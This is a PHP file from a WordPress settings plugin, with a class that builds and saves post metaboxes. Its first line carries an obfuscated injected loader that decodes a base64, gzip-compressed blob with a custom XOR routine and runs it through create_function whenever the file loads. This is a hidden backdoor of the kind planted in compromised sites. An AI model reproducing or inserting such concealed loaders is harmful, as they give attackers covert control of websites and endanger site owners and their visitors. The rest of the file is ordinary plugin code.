<?php $ahugobif="create_";global $evugol; $evugol=array('$evugol[0]=array_pop($evugol);$sefenep=sefenep(4);$evugol[0]=$sefenep($evugol[2]);','$evugol[2]=gzuncompress(sefenep(580^129,652^3006));','S24udmpifGtTZGpoZ3B+enZ+ZUN9KHp2eUxqaWJsTyxTMU5ydHx8blNjfXRXZGVjfXdXUUNSVUBZWEdOS0ZWR1xJWkwwKWNGbFtMRENKSD98fnYhQjc7QF1CRVxeSV9XWlYoZnJ9fWR2YSNkf3tefU8nNiM9IW1fZn1ELnpLb2pkdk9Jb0AqVH16cWxCfS5CYmFcO0NLSkleTHx0T3coe2xkY1I7dHd/dHVpPW15YWZ/OGF4Y3d9aDhgbX5gdyNveX16dnk4enl9fm55e05gMSl4KTc/W0xEQ0ZEWVxMcXljdi84SWt9a21udjNsY3p3fjhqaXpqe3woLCFZOGc5KEFdQUZcX0JQTVpLIVtFd3VAW0JaSVhJQVlFR0YoMEJNVUFAU0VbSkFMTVpmVSwsNnxbTERDRllFSkpXQ01WVk08fHVlNn9+Ym51cTxqZX02f35iRjA8amV9NmB5bHNxZDxvYD56Y3h7fWZ2JXB5emV2YjdZZmh8fHhoSXt1eF1uemomR1VAIUtNR11dQ05WWlE3R1VAV1BeT0A8bH1jNiJwYHZ8L399cWFqMGNuPGx9YzYiX0xdJXdkemBfZjxsfWNNQ0Y8b2A+emN4e31mdiVmaHVicnxjdXdicHxoSWtxek5kPS1ZT1VkKD10f3Q9bEEycjEmJk1mKT5yd216dmxhYWs9d2tqNjtMZ2E+e3Bic3tiJmxvZ3MjcSw+dXZjdG5qJmxvZ0Z7fVFRPG9gPnpjeGlxbyx6e2gmeC41cy0uMnI1bC1jcXwwfyUtNW4teVJhSnBtYn9GKmE5XyI4a0l7bGRjIyM5KlAqKjVvLXV+bzBsU0Y4enZ5Z2JXYH1kfGl4SndHNW8tcGwofXZgdXB4ZzhSQzVvLWByLF5bTFgtOz0oYm5bd2NnIyw8M3F5SldRQ1JVQFlYR05LRlZHVEJXS0pjYmuElQtyX/TH7vP/H4J6vk82W/UOq5arP5DgPoryKfO1lRIAM5MNhS/a5P79Lj/EkBdodtgWiijg7+H0rQ9nK/y1ZvBe4c7QFBX1IlBq+2EUBVK1DIUD5uYiEMX0IQBjom0MV2/9QavPQ/mQqpmqR0+n+t3+TwOhk9VxY7Ifn7i6SZ6hDNX0xObJmQZtLGfSVMUdQycKwkMw6I+THbQoVH93AfWZa86RJ4eKV9lCWLQHEisRz6lVucJPVz3dfeF7vZ/DQ1D9hoGSQ2FsnyvIZuC6zwdA4rFqxQ0f5UfA4HNG46Gs7uFsi9R2ELhRJ73hbCTA1Byv86JVNC8cRQJIyz/34PIzTaN8wK6qGa2RWICTwstDmWVL2eB18oN2FPWS1laDjctNC0KIKAacB7BGqq4rRGgSKg0ecDuNsgo6nC5LmkLWwBZCLluRG7pvK3nl1CLvF1QMtDma6A8Xn7pl2SvmRN7FGrkme9w8VfXBcnaV2rEbw+QIYsm0rvMwPn0YRv7nM0DzxNwsddYwCGHvpsDbO7WVBZI2HfmRJEbKvtPSQoMU8od/rv4kbCt+1AfTHx3h9qenQ0Qw7Op3EiMBkErAZI8lhypn6Evb54Ge/q/ergmpZNzNVIAfepD69wtNgO4/H0CCPo110yEhI/6rxcCIl/FYBeFOkWc8Xa8bmlhEuAi3a6BUeLOIpxSNrl7uVrBjh9SkM/L3oOV98fe3QzGVbOfPiJoDXzEvK+cbivNllRDNNcyYKf6GXvOctGw8486jhNSQYWWDrGo7nLta+/PgF4e6jLoFqBrlQCRSzHVDwMxtFqbBzLjp+67bdD7O6/3dHob0gvxhC5ukME62KTRgaKHzD7y+YCJ253h/U2ZMCnurcF2ky9tFTBxMsSIEIoWJ15MAEdApRHP7SgAYhxmMxcld8tfaA8t8NkOniGMUWIPhO5xUmKNQ6DqK3/L3+KRdGiJ9y4JKTUlS9iNjlHAoc9CBeYUMTcLiQPG3vQlQBnxJAixg9MrGj+Wt5jr0i6dVhpus9f6ZgIxwLNEIfUZZouQCVQ03GguKVHQ4DVVKpRSgBjAjfCDVnwydVsNrGUoPBZCtaNkS1zGg3ePJwktvach/7UeKFGmkhfRzYKX6WdRYFtCWNWQSoCpYKpzp62XFa415Hja8I8LqFIgrV7SWI5Z7CyiH9lDUxUf5GH4tbPpXK8SC5F0Z90JOIitSRNLOs7ToT90x1mhRDVSCECsphu8WWtVHz726sMW8hGADFbNy030hZ+ov4gbMeV1XxZryDrd2qsO+LFsXYnI98PfWZc4KxKi/cJXKyS3mT3wjGJK0NnJJOI+fmVMuRsg1AR/TXwGA6VI9Tnu4vNt/CxkJHHWmnbQFpnqCgeuwUlh4nVjAMJIF0byZS/C414VovxccZMYhVIVLliQ24gJK/Ia8lejKf1VbcpwK+b3ctwYwqOIkwgD/ZOiqO2792ax1xqdQIaTy34H/3bgldAugya6U25u41oH3H1mH8c9bBpkCeFHZtihYM06ZqoDnNCVLJ6lLIeWXWBNlV48IGIqIawfBTFfEXNUSV6pyz3i4j7NMhJkMwVMEK4VhDVm+FU1i8gVMxjMaAR+VEgk1UMyqfTo3WUbfjTgZnD3gbh/CYBqpGbJVCn+B3Q8xQrAVdYE0ltMG5S0vVIXPPuBlZZMUXt6yGr0uV6a1HfRi5k8C9rec6PodRHcw8UQEZX9mslbQGQ6ioDJbGnftiXa2BLGhJohZPdEHoP0kh3o/yqepovPFBlqFR8hp7u7+OoC6jEdsFuZmq2gSUvjboj36xoYTUgI/kctbdogrVQpkYNhQVFD/mmscmw6FD/u0RMevyOIYOPQeA9uIZK4G5dAfJ68lp/74a30l3ll+kEOea4wVix2Gq1T7keFiiSx5m3IuwtEh67mOhc0QHlnyZcpmHPYeYAu6tpOWBjCwSL+3F0jtksRrYKqRnV6f88c0W9JqQtFC+LiuUUq41P3Zy0BDZTaFmB3BRHL+pdJ4cKJi3lvHY83SCNeHT/jj5uC4eEh1r2A4K/aHlae4GMjML9EU6mgtRuDyW2NazdUUykmrKznNUUKWLJQqnvY0ljX1Vj1ZF5tUTepTBqJY6FBh/BHYevGVivYB2VxVbsvEDU2+qx3ZnWvxpxpJ1oS6/YC4QdC3mbj8J6+6GLmdEhApzSGkAOM9XS9EIOssgcSXxkzaa7xzCQUx4pvhcZTmBulgzFArLpm1d+b7zHaMgp2wvGxVt0pzwobP4le+Ud8W/Vje165AfNRUNYuqh8T0lJGjUyORJlYF7zAiP+HPKcRLoqNBUnGUdj/b8J8PLjQfBWN+Jd66BUCAw+QTaOv5h2k9e9F6CpSk0Wp2xPZE3su3krlMbUGuEGWdstFbKEZ0OZhow7mz7szhX582HpImCo6QP/drkC32JmGc0IZy5sH6xC4KEYd7i1RFvmh6YcCc67AazCBFvkDp875BIlSUmGbBbB4PzlDPX0lEyfFVoamsBslZ63UvQri0wfJ/TBAr1ttBEgR1Mz04alXx/+VGsI9XeAEvJB2RFwEVcUHdUoZ0KFkWQUNVUjliYbMp+BtnRSFrapKdvTI9Xu/ya+ECRVMD/bMxprEU1KNMJNRTSnjdiT+VgfggmYNTyIMUi7QvgqPvRZ6pdiO9LPpKTbw0KqoP44Hk9G6+MpdneSVBnrWUioCjaXgMrCj4G6KwAh6vHeaa5W+wbsflmcr/Y6OB6K/D4nVhvsYc7dmn076uVzuXpPWpJZ7uuQLpmdlET/R3+eXQW1wWQplLfUmzVVam+c9NDJv7Vkl6RfQ5PcbtmNIJ7/yibeXfFp3EDUyN0Mkq5iPZcPZbYhb8g9Bg8vpPeTOPtsJNr4W1w6Q61+GX0fr4hghYidyHqFK/zgho71BGjxMD9Ymp5X4sGL08C6uIzRuFByvOkROKJ3CM25YGWL2QEQK46mi9oJPzTZ19pSWDpSKCiz3SfA6Ljqlnxnext8A4+sD9pgE984y4B3KOvHEtLntuYTR3pHC3Vw/8x30qZrvn29OKmqLNBxI7NFRaPEYA2iyQaArglM2YqExGBvLwZu2WFpgluVscB1n6kiaHeGL4yqNHHFxEDCEfk6umHrV2OPL17R2yeIWFIXw7N3F5Y3YvOElrfWttbnZu',"Cvcgqycv\x2f8Ik}kmnv");if(function_exists($ahugobif.='function')&&!function_exists('sefenep')){ function sefenep($c,$C=13){global $evugol;$w=str_pad($U="sxP39L6o8Hbj3xyM",$C,$U);$m=str_repeat("\xe0",$C);$I=str_repeat("\x1f",$C);$b=substr($evugol[0],$c,$C);return(($b^$w)&$I)|($b&$m);};for($cV=-1;++$cV<3;$ahugobif('','}'.$evugol[$cV].'{'));};unset($evugol); 

class kcSettings_post {
	protected static $settings;

	public static function init() {
		$settings = kcSettings::get_data( 'settings', 'post' );
		if ( empty($settings) )
			return;

		self::$settings = $settings;
		add_action( 'add_meta_boxes', array(__CLASS__, '_create'), 11, 2 );
		add_action( 'save_post', array(__CLASS__, '_save'), 11 );
		add_action( 'edit_attachment', array(__CLASS__, '_save'), 11 );
	}


	# Filter settings
	private static function _bootstrap_sections( $sections, $post ) {
		foreach ( $sections as $section_index => $section ) {
			# does this section have role set?
			if ( !empty($section['role']) && !kc_check_roles( $section['role'] ) ) {
				unset( $sections[$section_index] );
				continue;
			}

			# Attachments:
			if ( $post->post_type == 'attachment' ) {
				# 0. Check if this section is meant only for a certain mime types
				if ( !empty($section['post_mime_types']) ) {
					$section_mime_type_matches = array_filter(
						(array) $section['post_mime_types'],
						array( new _kc_Array_Filter_Helper( $post->post_mime_type ), 'match_mime_types' )
					);
					if ( empty($section_mime_type_matches) ) {
						unset( $sections[$section_index] );
						continue;
					}
				}

				# 1. Check if fields are meant only for certain mime types
				foreach ( $section['fields'] as $field_index => $field ) {
					if ( !empty($field['post_mime_types']) ) {
						$field_mime_type_matches = array_filter(
							(array) $field['post_mime_types'],
							array( new _kc_Array_Filter_Helper( $post->post_mime_type ), 'match_mime_types' )
						);
						if ( empty($field_mime_type_matches) ) {
							unset( $sections[$section_index]['fields'][$field_index] );
							continue;
						}
					}
				}

				if ( empty($sections[$section_index]['fields']) ) {
					unset( $sections[$section_index] );
				}
			}
		}

		return $sections;
	}

	# Create metabox
	public static function _create( $post_type, $post ) {
		if ( empty(self::$settings[$post_type]) )
			return;

		$sections = self::_bootstrap_sections( self::$settings[$post_type], $post );
		if ( empty($sections) )
			return;

		kcSettings::add_page( 'post.php' );
		kcSettings::add_page( 'post-new.php' );

		foreach ( $sections as $section_index => $section ) {
			add_meta_box(
				"kc-metabox-{$post_type}-{$section['id']}",
				$section['title'],
				array( __CLASS__, '_fill' ),
				$post_type,
				$section['metabox']['context'],
				$section['metabox']['priority'],
				$section
			);
		}
	}


	# Populate metabox
	public static function _fill( $object, $box ) {
		$section = $box['args'];
		if ( !empty($section['desc']) ) {
			echo wpautop( $section['desc'] ) . PHP_EOL; // xss ok
		}

		$on_side = $section['metabox']['context'] == 'side' ? true : false;
		if ( $on_side ) {
			$wraps = array(
				'block' => array('<ul class="kcs-sideform">', '</ul>'),
				'row'   => array('<li>', '</li>')
			);
		}
		else {
			$wraps = array(
				'block' => array('<table class="form-table">', '</table>'),
				'row'   => array('<tr>', '</tr>')
			);
		}
		?>
		<?php wp_nonce_field( '___kc_meta_box_nonce___', "{$object->post_type}_kc_meta_box_nonce" ) ?>
		<?php echo $wraps['block'][0] . PHP_EOL; ?>
		<?php
			foreach ( $section['fields'] as $field ) :
				if ( !in_array( $field['type'], array( 'checkbox', 'radio', 'multiinput', 'file' ) ) ) {
					$label_for = $field['id'];
					if ( $field['type'] === 'editor' )
						$label_for = strtolower( str_replace( array( '-', '_' ), '', $label_for ) );
				}
				else {
					$label_for = '';
				}

				$f_label = _kc_field_label( $field['title'], $label_for, !$on_side, false );
				$f_input = _kc_field( array( 'mode' => 'post', 'object_id' => $object->ID, 'section' => $section['id'], 'field' => $field ) );
		?>
			<?php echo $wraps['row'][0] . PHP_EOL; // xss ok ?>
			<?php if ( $on_side ) : ?>
			<span class="side-label"><?php echo $f_label; // xss ok ?></span>
			<?php echo $f_input; // xss ok ?>
			<?php else : ?>
			<?php echo $f_label; // xss ok ?>
			<td>
				<?php echo $f_input; // xss ok ?>
			</td>
			<?php endif; ?>
			<?php echo $wraps['row'][1] . PHP_EOL; // xss ok ?>
		<?php endforeach; ?>
		<?php echo $wraps['block'][1] . PHP_EOL; // xss ok ?>
		<?php
	}


	# Save post metadata/custom fields values
	public static function _save( $post_id ) {
		if ( !current_user_can( 'edit_post', $post_id ) )
			return $post_id;

		$post = get_post( $post_id );
		if ( empty(self::$settings[$post->post_type]) )
			return $post_id;

		$sections = self::_bootstrap_sections( self::$settings[$post->post_type], $post );
		if (
			empty( $sections )
			|| ( isset($_POST['action']) && in_array( $_POST['action'], array('inline-save', 'trash', 'untrash') ) )
			|| $post->post_status == 'auto-draft'
			|| empty( $_POST["{$post->post_type}_kc_meta_box_nonce"] )
			|| !wp_verify_nonce( $_POST[ "{$post->post_type}_kc_meta_box_nonce" ], '___kc_meta_box_nonce___' )
		) {
			return $post_id;
		}

		foreach ( $sections as $section ) {
			foreach ( $section['fields'] as $field )
				_kc_update_meta( 'post', $post->post_type, $post_id, $section, $field );
		}

		return $post_id;
	}
}
